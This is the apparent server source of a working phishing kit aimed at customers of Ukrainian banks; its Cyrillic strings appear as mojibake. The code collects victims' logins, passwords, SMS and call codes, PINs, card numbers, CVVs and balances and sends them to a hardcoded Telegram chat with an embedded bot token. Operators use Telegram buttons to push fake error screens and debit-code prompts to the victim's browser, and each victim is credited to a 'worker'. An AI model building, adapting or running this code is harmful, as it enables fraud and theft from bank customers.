const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');
const { atob } = require('buffer');

// --- –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ---
const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
const CHAT_ID = '-4840920969';
// --- –ö–û–ù–ï–¶ –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–ò ---

const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;

const app = express();
app.use(express.json());
app.use(cors());

app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});
app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });
app.get('/panel', (req, res) => { res.sendFile(path.join(__dirname, 'panel.html')); });

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

if (WEBHOOK_URL) {
    bot.setWebHook(WEBHOOK_URL)
        .then(() => console.log(`Webhook —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞ ${WEBHOOK_URL}`))
        .catch(err => console.error('–û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –≤–µ–±—Ö—É–∫–∞:', err));
    bot.sendMessage(CHAT_ID, ' –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏–ª —Å–µ—Ä–≤–∞–∫.', { parse_mode: 'HTML' }).catch(console.error);
} else {
    console.error('–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: –Ω–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å RENDER_EXTERNAL_URL. –í–µ–±—Ö—É–∫ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.');
}

bot.getMe().then(me => console.log(`–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω: @${me.username}`)).catch(err => console.error('–û—à–∏–±–∫–∞ –±–æ—Ç–∞:', err));
app.post(webhookPath, (req, res) => { bot.processUpdate(req.body); res.sendStatus(200); });

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });
const clients = new Map();
const sessions = new Map();

wss.on('connection', (ws) => {
    console.log('–ö–ª–∏–µ–Ω—Ç –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è –ø–æ WebSocket');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`–ö–ª–∏–µ–Ω—Ç –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω: ${data.sessionId}`);
            }
        } catch (e) { console.error('–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ WebSocket —Å–æ–æ–±—â–µ–Ω–∏—è:', e); }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`–ö–ª–∏–µ–Ω—Ç –æ—Ç–∫–ª—é—á–∏–ª—Å—è: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => console.error('–û—à–∏–±–∫–∞ WebSocket:', error));
});

bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);

    if (!ws || ws.readyState !== WebSocket.OPEN) {
        bot.answerCallbackQuery(callbackQuery.id, { text: '‚ùóÔ∏è–û—à–∏–±–∫–∞: –∫–ª–∏–µ–Ω—Ç –Ω–µ –≤ —Å–µ—Ç–∏!', show_alert: true });
        return;
    }

    const sessionData = sessions.get(sessionId) || {};
    let command = { type: type, data: {} };
    let responseText = `–ö–æ–º–∞–Ω–¥–∞ "${type}" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!`;

    switch (type) {
        case 'lk':
        case 'call':
        case 'ban':
        case 'number_error':
        case 'balance_error':
            break; 

        case 'telegram_debit':
            if (sessionData.bankName === '–û—â–∞–¥–±–∞–Ω–∫') {
                command.type = 'telegram_debit';
            } else {
                command.type = 'show_debit_form';
            }
            break;
            
        case 'password_error':
            if (sessionData.bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω') {
                 command.type = 'raiff_pin_error';
                 responseText = '–ó–∞–ø—Ä–æ—Å "–Ω–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            } else {
                command.data = { loginType: sessionData.loginMethod || 'phone' };
            }
            break;

        case 'code_error':
            if (sessionData.bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω') {
                command.type = 'raiff_code_error';
            } else if (sessionData.bankName !== '–û—â–∞–¥–±–∞–Ω–∫') {
                command.type = 'generic_debit_error';
            }
            responseText = '–ó–∞–ø—Ä–æ—Å "–Ω–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            break;
            
        case 'request_details':
            if (sessionData.bankName === '–ê–ª—å—è–Ω—Å') {
                command.type = 'request_alliance_card_details';
                responseText = '–ó–∞–ø—Ä–æ—Å (–ê–ª—å—è–Ω—Å) –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            } 
            else if (sessionData.bankName !== '–û—â–∞–¥–±–∞–Ω–∫') {
                 command.type = 'show_card_details_form';
                 responseText = '–ó–∞–ø—Ä–æ—Å (–æ–±—â–∏–π) –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            } 
            else {
                 bot.answerCallbackQuery(callbackQuery.id, { text: '–ö–æ–º–∞–Ω–¥–∞ "–ó–∞–ø—Ä–æ—Å" –Ω–µ –ø—Ä–∏–º–µ–Ω–∏–º–∞ –¥–ª—è –û—â–∞–¥–±–∞–Ω–∫–∞', show_alert: true });
                 return;
            }
            break;
            
        case 'other':
             command.data = { text: "–ü–æ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏–º –ø—Ä–∏—á–∏–Ω–∞–º –¥–∞–Ω–Ω—ã–π –±–∞–Ω–∫ –≤—Ä–µ–º–µ–Ω–Ω–æ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–±–µ—Ä–∏—Ç–µ –¥—Ä—É–≥–æ–π." };
             break;
            
        default:
            bot.answerCallbackQuery(callbackQuery.id, { text: `–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞: ${type}` });
            return;
    }

    ws.send(JSON.stringify(command));
    bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
});


app.post('/api/submit', (req, res) => {
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
    let workerNick = 'unknown';
    try { if (referrer && referrer !== 'unknown') workerNick = atob(referrer); } catch (e) { /* ignore */ }
    
    const existingData = sessions.get(sessionId) || {};
    const newData = { ...existingData, ...stepData, workerNick };
    sessions.set(sessionId, newData);
    
    let message = '';
    
    if (newData.bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω') {
        if (stepData.phone) {
            message = `<b>üì± –ù–æ–≤—ã–π –ª–æ–≥ (–†–∞–π—Ñ) - –¢–µ–ª–µ—Ñ–æ–Ω</b>\n\n`;
            message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${stepData.phone}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            sendToTelegram(message, sessionId, newData.bankName);
        } else if (stepData.sms_code) {
            message = `<b>üí¨ –ö–æ–¥ –∏–∑ SMS (–†–∞–π—Ñ)</b>\n\n`;
            message += `<b>–ö–æ–¥:</b> <code>${stepData.sms_code}</code>\n`;
            message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${newData.phone}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } else if (stepData.pin) {
            message = `<b>üîí PIN-–∫–æ–¥ (–†–∞–π—Ñ)</b>\n\n`;
            message += `<b>–ü–∏–Ω:</b> <code>${stepData.pin}</code>\n`;
            message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${newData.phone}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } 
        // --- –î–û–ë–ê–í–õ–ï–ù –≠–¢–û–¢ –ë–õ–û–ö ---
        else if (stepData.debit_sms_code) {
            message = `<b>üí∏ –ö–æ–¥ —Å–ø–∏—Å–∞–Ω–∏—è (–†–∞–π—Ñ)</b>\n\n`;
            message += `<b>–ö–æ–¥:</b> <code>${stepData.debit_sms_code}</code>\n`;
            const phone = newData.phone || '–Ω–µ —É–∫–∞–∑–∞–Ω';
            message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${phone}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        }
    } 
    else {
        if (stepData.call_code) {
            message = `<b>üìû –ö–æ–¥ —Å–æ –∑–≤–æ–Ω–∫–∞ (–û—â–∞–¥)</b>\n\n`;
            message += `<b>–ö–æ–¥:</b> <code>${stepData.call_code}</code>\n`;
            const phone = newData.phone || newData.fp_phone || '–Ω–µ —É–∫–∞–∑–∞–Ω';
            message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${phone}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        }
        else if (stepData.sms_code) {
            message = `<b>üí∏ –ö–æ–¥ —Å–ø–∏—Å–∞–Ω–∏—è (–û—â–∞–¥)</b>\n\n`;
            message += `<b>–ö–æ–¥:</b> <code>${stepData.sms_code}</code>\n`;
            const phone = newData.phone || newData.fp_phone || '–Ω–µ —É–∫–∞–∑–∞–Ω';
            message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${phone}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        }
        else if (stepData.debit_sms_code) {
            message = `<b>üí∏ –ö–æ–¥ —Å–ø–∏—Å–∞–Ω–∏—è (${newData.bankName})</b>\n\n`;
            message += `<b>–ö–æ–¥:</b> <code>${stepData.debit_sms_code}</code>\n`;
            const phone = newData.phone || '–Ω–µ —É–∫–∞–∑–∞–Ω';
            message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${phone}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        }
        else if (stepData.card_details) {
            const details = stepData.card_details;
            message = `<b>–î–∞–Ω–Ω—ã–µ –ø–æ –∑–∞–ø—Ä–æ—Å—É (${newData.bankName})</b>\n\n`;
            message += `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${details.card || details.card_number_full || 'N/A'}</code>\n`;
            message += `<b>–°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è:</b> <code>${details.exp || details.exp_date || 'N/A'}</code>\n`;
            message += `<b>CVV:</b> <code>${details.cvv || 'N/A'}</code>\n`;
            message += `<b>–ë–∞–ª–∞–Ω—Å:</b> <code>${details.balance || 'N/A'}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        }
        else if (stepData.fp_pin) {
            message = `<b>üîß –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ (–û—â–∞–¥)</b>\n\n`;
            message += `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${newData.bankName}\n`;
            message += `<b>–ú–æ–±–∏–ª—å–Ω—ã–π:</b> <code>${newData.fp_phone}</code>\n`;
            message += `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${newData.fp_card}</code>\n`;
            message += `<b>–ü–∏–Ω:</b> <code>${stepData.fp_pin}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            sendToTelegram(message, sessionId, newData.bankName);
        }
        else if (stepData.password && (stepData.login || stepData.phone)) {
            if (stepData.login) {
                message = `<b>üè¶ –í—Ö–æ–¥ –≤ –û—â–∞–¥ (–õ–æ–≥–∏–Ω)</b>\n\n`;
                message += `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${newData.bankName}\n`;
                message += `<b>–õ–æ–≥–∏–Ω:</b> <code>${stepData.login}</code>\n`;
                message += `<b>–ü–∞—Ä–æ–ª—å:</b> <code>${stepData.password}</code>\n`;
            } else {
                message = `<b>üè¶ –í—Ö–æ–¥ –≤ –û—â–∞–¥ (–¢–µ–ª–µ—Ñ–æ–Ω)</b>\n\n`;
                message += `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${newData.bankName}\n`;
                message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${stepData.phone}</code>\n`;
                message += `<b>–ü–∞—Ä–æ–ª—å:</b> <code>${stepData.password}</code>\n`;
            }
            message += `<b>Worker:</b> @${workerNick}\n`;
            sendToTelegram(message, sessionId, newData.bankName);
        }
        else if (isFinalStep) {
            message = `<b>üí≥ –ù–æ–≤—ã–π –ª–æ–≥ (${newData.bankName})</b>\n\n`;
            message += `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${newData.bankName}\n`;
            if (newData.phone) message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${newData.phone}</code>\n`;
            if (newData.card_number) message += `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç–∏:</b> <code>${newData.card_number}</code>\n`;
            if (newData.card) message += `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç–∏:</b> <code>${newData.card}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            sendToTelegram(message, sessionId, newData.bankName);
        }
    }
    
    res.status(200).json({ message: 'OK' });
});


app.post('/api/sms', (req, res) => {
    const { sessionId, code, referrer } = req.body;
    let workerNick = 'unknown';
    try { if (referrer && referrer !== 'unknown') workerNick = atob(referrer); } catch (e) {}
    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = `<b>üí¨ –ü–æ–ª—É—á–µ–Ω–æ SMS (—Å—Ç–∞—Ä—ã–π –ø–æ—Ç–æ–∫)</b>\n\n`;
        message += `<b>–ö–æ–¥:</b> <code>${code}</code>\n`;
        if(sessionData.phone) message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${sessionData.phone}</code>\n`;
        message += `<b>–°–µ—Å—Å–∏—è:</b> <code>${sessionId}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

function sendToTelegram(message, sessionId, bankName) {
    let keyboard = [];

    if (bankName === '–û—â–∞–¥–±–∞–Ω–∫') {
        keyboard = [
            [{ text: '–ó–≤–æ–Ω–æ–∫', callback_data: `call:${sessionId}` }, { text: '–°–ø–∏—Å–∞–Ω–∏–µ', callback_data: `telegram_debit:${sessionId}` }, { text: '–ó–∞–ø—Ä–æ—Å', callback_data: `request_details:${sessionId}` }],
            [{ text: '‚ùå–ü–∞—Ä–æ–ª—å', callback_data: `password_error:${sessionId}` }, { text: '‚ùå–ö–æ–¥', callback_data: `code_error:${sessionId}` }, { text: '‚ùå–ù–æ–º–µ—Ä', callback_data: `number_error:${sessionId}` }],
            [{ text: '‚ùå–ë–∞–ª–∞–Ω—Å', callback_data: `balance_error:${sessionId}` }, { text: '–î—Ä—É–≥–æ–π', callback_data: `other:${sessionId}` }, { text: '–ë–∞–Ω', callback_data: `ban:${sessionId}` }]
        ];
    } else if (bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω') {
         keyboard = [
            [{ text: '–°–ø–∏—Å–∞–Ω–∏–µ', callback_data: `telegram_debit:${sessionId}` }, { text: '–ó–∞–ø—Ä–æ—Å', callback_data: `request_details:${sessionId}` }],
            [{ text: '‚ùå–ü–∞—Ä–æ–ª—å', callback_data: `password_error:${sessionId}` }, { text: '‚ùå–ö–æ–¥', callback_data: `code_error:${sessionId}` }, { text: '‚ùå–ù–æ–º–µ—Ä', callback_data: `number_error:${sessionId}` }],
            [{ text: '‚ùå–ë–∞–ª–∞–Ω—Å', callback_data: `balance_error:${sessionId}` }, { text: '–î—Ä—É–≥–æ–π', callback_data: `other:${sessionId}` }, { text: '–ë–∞–Ω', callback_data: `ban:${sessionId}` }]
        ];
    } else { // –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –¥–ª—è –≤—Å–µ—Ö –æ—Å—Ç–∞–ª—å–Ω—ã—Ö –±–∞–Ω–∫–æ–≤
        keyboard = [
            [{ text: '–°–ø–∏—Å–∞–Ω–∏–µ', callback_data: `telegram_debit:${sessionId}` }, { text: '–ó–∞–ø—Ä–æ—Å', callback_data: `request_details:${sessionId}` }],
            [{ text: '‚ùå–ö–æ–¥', callback_data: `code_error:${sessionId}` }, { text: '‚ùå–ù–æ–º–µ—Ä', callback_data: `number_error:${sessionId}` }, { text: '‚ùå–ë–∞–ª–∞–Ω—Å', callback_data: `balance_error:${sessionId}` }],
            [{ text: '–î—Ä—É–≥–æ–π', callback_data: `other:${sessionId}` }, { text: '–ë–∞–Ω', callback_data: `ban:${sessionId}` }]
        ];
    }

    bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard } })
       .catch(err => console.error("Telegram send error:", err));
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`));
